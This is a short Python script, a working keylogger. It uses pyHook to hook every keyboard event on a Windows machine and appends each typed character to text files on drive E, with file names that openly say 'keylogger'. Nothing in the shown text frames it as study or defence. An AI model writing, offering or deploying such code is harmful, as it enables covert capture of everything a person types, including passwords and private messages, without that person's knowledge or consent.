import pyHook, pythoncom, sys, logging
# feel free to set the file_log to a different file name/location

file_log = 'E:\keyloggeroutput5.txt'
file_log_1 = 'E:\key_logger_output_specialKeys.txt'

def OnKeyboardEvent(event):
    # logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
    # logging.log(10, chr(event.Ascii))
    fl = open(file_log_1, 'a')
    fl.write(chr(event.Ascii))
    return True


hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()
